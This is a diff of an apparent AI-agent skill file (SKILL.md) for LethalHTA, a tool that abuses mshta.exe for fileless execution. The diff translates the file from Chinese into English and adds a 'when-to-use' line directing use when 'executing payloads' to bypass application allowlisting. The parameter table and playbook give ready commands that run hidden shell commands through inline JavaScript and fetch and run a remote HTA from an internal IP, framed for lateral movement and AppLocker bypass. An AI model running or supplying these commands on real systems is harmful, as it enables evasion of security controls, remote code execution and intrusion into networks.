@@ -2,37 +2,41 @@
 name: lethalhta-mshta
 description: "LethalHTA abuses mshta for allowlisted execution. Signals: lateral movement, psexec, direct execution, remote HTA, README reference."
 zh-signals: "LethalHTA: mshta 白名单执行。信号:横向移动,psexec,直接执行,远程 HTA,参考 README。"
+when-to-use: >-
+  Use when executing payloads through mshta.exe to bypass application
+  allowlisting; run inline JavaScript or a remote HTA during lateral movement
+  or initial execution.
 ---
 
 # LethalHTA
 
-- 攻击大类:C31 远程服务横向移动
-- 上游仓库:https://github.com/codewhitesec/LethalHTA
-- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C31 Remote Service Lateral Movement
+- Upstream Repository: https://github.com/codewhitesec/LethalHTA
+- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/codewhitesec/LethalHTA
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `mshta.exe 'javascript:RnK5=new ActiveXObject("WScript.Shell");RnK5.Run("cmd /c whoami",0);close();'` | 直接执行 |
-| `mshta http://10.0.0.5/payload.hta` | 远程 HTA |
-| `Rundll32 混淆变体` | 参考 README |
+| `mshta.exe 'javascript:RnK5=new ActiveXObject("WScript.Shell");RnK5.Run("cmd /c whoami",0);close();'` | Direct execution |
+| `mshta http://10.0.0.5/payload.hta` | Remote HTA |
+| `Rundll32 obfuscated variant` | Refer to the README |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### mshta 白名单执行
+### mshta allowlisted execution
 
 ```bash
 mshta 'javascript:o=new ActiveXObject("WScript.Shell");o.Run("calc.exe",0);close();'
-# 常被 AppLocker 白名单放行 mshta.exe
+# mshta.exe is often allowed by AppLocker allowlists
 ```
 
-## 注意事项
+## Notes
 
-codewhitesec 出品,mshta.exe 无文件执行载荷的技术合集,绕过应用白名单。
+From codewhitesec; a collection of fileless mshta.exe execution payloads that bypass application allowlists.
